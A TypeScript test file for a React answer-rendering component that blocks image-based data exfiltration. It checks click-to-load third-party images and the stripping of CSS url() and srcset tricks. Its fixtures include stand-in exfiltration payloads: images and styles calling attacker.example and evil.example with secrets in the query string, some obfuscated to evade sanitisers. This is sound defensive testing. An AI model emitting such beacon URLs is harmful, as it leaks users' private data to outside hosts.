import React from 'react';
import { describe, it, expect, afterEach, vi } from 'vitest';
import { render, cleanup, fireEvent } from '@testing-library/react';
import { Theme } from '@radix-ui/themes';
import { AnswerContent } from '../answer-content';
import type { CitationMaps } from '../response-tabs/citations';

const mockIsMobile = vi.hoisted(() => ({ value: false }));
vi.mock('@/lib/hooks/use-is-mobile', () => ({ useIsMobile: () => mockIsMobile.value }));

afterEach(() => {
  cleanup();
  mockIsMobile.value = false;
});

const h = React.createElement;

const EMPTY_MAPS: CitationMaps = {
  citations: {},
  sources: {},
  sourcesOrder: [],
  citationsOrder: {},
};

function renderAnswer(content: string, isStreaming = false) {
  return render(
    h(Theme, null, h(AnswerContent, { content, citationMaps: EMPTY_MAPS, isStreaming })),
  );
}

const EXFIL = 'https://attacker.example/pixel.png?q=secret-from-document';

describe('AnswerContent — third-party images need a click to load', () => {
  it('does not render an <img> for a third-party image, so nothing is fetched', () => {
    const { container, getByText } = renderAnswer(`Before\n\n![chart](${EXFIL})\n\nAfter`);

    expect(container.querySelector('img')).toBeNull();
    expect(getByText('External image not loaded')).toBeTruthy();
    expect(getByText('Load image')).toBeTruthy();
    expect(container.innerHTML).not.toContain('secret-from-document');
  });

  it('gives the load button a 44px touch target on mobile only', () => {
    const desktop = renderAnswer(`![chart](${EXFIL})`);
    expect((desktop.getByText('Load image') as HTMLElement).style.minHeight).toBe('');
    cleanup();

    mockIsMobile.value = true;
    const mobile = renderAnswer(`![chart](${EXFIL})`);
    const button = mobile.getByText('Load image') as HTMLElement;
    expect(button.style.minHeight).toBe('44px');
    expect(button.style.minWidth).toBe('44px');
  });

  it('keeps the alt text visible while the image is blocked', () => {
    const { getByText } = renderAnswer(`![quarterly chart](${EXFIL})`);
    expect(getByText('quarterly chart')).toBeTruthy();
  });

  it('loads the image only after the user clicks the button, without sending a referrer', () => {
    const { container, getByText } = renderAnswer(`![chart](${EXFIL})`);

    fireEvent.click(getByText('Load image'));

    const img = container.querySelector('img');
    expect(img).not.toBeNull();
    expect(img!.getAttribute('src')).toBe(EXFIL);
    expect(img!.getAttribute('referrerpolicy')).toBe('no-referrer');
    expect(img!.getAttribute('loading')).toBe('lazy');
    expect(container.textContent).not.toContain('External image not loaded');
  });

  it('treats a protocol-relative URL as third party', () => {
    const { container } = renderAnswer('![x](//attacker.example/pixel.png?q=secret)');
    expect(container.querySelector('img')).toBeNull();
  });

  it('blocks third-party images while the answer is still streaming', () => {
    const { container } = renderAnswer(`![chart](${EXFIL})\n\nmore text`, true);
    expect(container.querySelector('img')).toBeNull();
  });

  it('loads record and document images on the app origin straight away', () => {
    const sameOrigin = `${window.location.origin}/api/v1/document/d1/download`;
    const { container } = renderAnswer(`![a](/api/v1/knowledgeBase/stream/record/r1)\n\n![b](${sameOrigin})`);

    const srcs = Array.from(container.querySelectorAll('img')).map((i) => i.getAttribute('src'));
    expect(srcs).toEqual(['/api/v1/knowledgeBase/stream/record/r1', sameOrigin]);
    expect(container.textContent).not.toContain('External image not loaded');
  });

  it.each([
    '/api/v1/img.png',
    '/api/v1/redirect?to=https://attacker.example/&d=secret',
    '/api/v1/knowledgeBase/stream/record/r1?d=secret',
    '/api/v1/knowledgeBase/stream/record/r1/../../../users',
    '/chat?conversationId=secret',
    `${window.location.origin}/anything.png`,
  ])('asks before loading an app-origin image outside the record and document paths: %s', (src) => {
    const { container, getByText } = renderAnswer(`![a](${src})`);
    expect(container.querySelector('img')).toBeNull();
    expect(getByText('Load image')).toBeTruthy();
  });

  it('shows an image the server held back as a click-to-load placeholder naming its host', () => {
    const held = `held-image:${encodeURIComponent(EXFIL)}`;
    const { container, getByText } = renderAnswer(`![chart](${held})`);

    expect(container.querySelector('img')).toBeNull();
    expect(getByText('from attacker.example')).toBeTruthy();
    fireEvent.click(getByText('Load image'));
    expect(container.querySelector('img')!.getAttribute('src')).toBe(EXFIL);
  });

  it('shows a held image from raw HTML the same way', () => {
    const held = `held-image:${encodeURIComponent(EXFIL)}`;
    const { container, getByText } = renderAnswer(`<p>see <img src="${held}" alt="pixel"></p>`);
    expect(container.querySelector('img')).toBeNull();
    expect(getByText('Load image')).toBeTruthy();
  });

  it('asks separately for each third-party image', () => {
    const second = 'https://other.example/b.png';
    const { container, getAllByText } = renderAnswer(`![a](${EXFIL})\n\n![b](${second})`);

    const buttons = getAllByText('Load image');
    expect(buttons).toHaveLength(2);

    fireEvent.click(buttons[0]);

    const imgs = container.querySelectorAll('img');
    expect(imgs).toHaveLength(1);
    expect(imgs[0].getAttribute('src')).toBe(EXFIL);
    expect(getAllByText('Load image')).toHaveLength(1);
  });
});

describe('AnswerContent — the same policy for raw HTML, data: images and inline styles', () => {
  const EVIL = 'https://evil.example/p?d=secret';
  const imgSrcs = (root: HTMLElement) =>
    Array.from(root.querySelectorAll('img')).map((i) => i.getAttribute('src'));

  it('renders relative, same-origin and data: images directly', () => {
    const dataUri = 'data:image/png;base64,iVBORw0KGgo=';
    const sameOrigin = `${window.location.origin}/api/v1/document/d1/download`;
    const { container, queryByTestId } = renderAnswer(
      [
        '![rel](/api/v1/knowledgeBase/stream/record/r1)',
        '',
        `![abs](${sameOrigin})`,
        '',
        `![data](${dataUri})`,
      ].join('\n'),
    );
    expect(imgSrcs(container)).toEqual(['/api/v1/knowledgeBase/stream/record/r1', sameOrigin, dataUri]);
    expect(queryByTestId('remote-image-placeholder')).toBeNull();
  });

  it('gives raw HTML <img> (rehypeRaw path) the same placeholder', () => {
    const { container, getByText } = renderAnswer(`<p>see <img src="${EVIL}" alt="pixel"></p>`);
    expect(imgSrcs(container)).toEqual([]);
    expect(getByText('Load image')).toBeTruthy();
  });

  it.each([
    'background-image:url(https://evil.example/?d=secret)',
    'background:url/**/(https://evil.example/?d=secret)',
    'background:URL(https://evil.example/?d=secret)',
    'background-image:image("https://evil.example/?d=secret")',
    'background-image:image-set("https://evil.example/?d=secret" 1x)',
    'background-image:cross-fade(url(https://evil.example/?d=secret), none)',
    'background:\\75 rl(https://evil.example/?d=secret)',
    'list-style:u/**/rl(https://evil.example/?d=secret)',
  ])('strips an inline style that could fetch: %s', (style) => {
    const { container } = renderAnswer(`<span style='${style}'>x</span> <span style="color:red">y</span>`);
    expect(container.innerHTML).not.toContain('evil.example');
    expect(container.innerHTML).toContain('color: red');
  });
});

describe('AnswerContent — only <img src> and <a href> carry URLs', () => {
  const PIXEL = 'https://attacker.example/p.gif?d=CNRY_R';
  const DATA_GIF = 'data:image/gif;base64,R0lGODlhAQABAAAAACw=';

  it.each([
    ['an app-origin image', `<picture><source srcset="${PIXEL}"><img src="/api/v1/knowledgeBase/stream/record/r1"></picture>`],
    ['a data: image', `<picture><source srcset="${PIXEL}"><img src="${DATA_GIF}"></picture>`],
    [
      'an image, with the URL spelled in character references',
      '<picture><source srcset="https&#x3a;//attacker.example/p.gif&#x3f;d=CNRY_R"><img src="/api/v1/knowledgeBase/stream/record/r1"></picture>',
    ],
    ['nothing else', `<picture><source srcset="${PIXEL}"></picture>`],
  ])('drops <picture><source srcset> beside %s', (_label, html) => {
    const { container } = renderAnswer(`Before\n\n${html}\n\nAfter`);
    expect(container.querySelector('picture, source')).toBeNull();
    expect(container.innerHTML).not.toContain('attacker.example');
  });

  it.each([
    `<video poster="${PIXEL}" src="${PIXEL}"></video>`,
    `<audio src="${PIXEL}"></audio>`,
    `<blockquote cite="${PIXEL}">q</blockquote>`,
    `<img src="${DATA_GIF}" longdesc="${PIXEL}">`,
    `<div itemscope itemtype="${PIXEL}">x</div>`,
  ])('keeps no other URL-bearing tag or attribute: %s', (html) => {
    const { container } = renderAnswer(html);
    expect(container.innerHTML).not.toContain('attacker.example');
  });
});
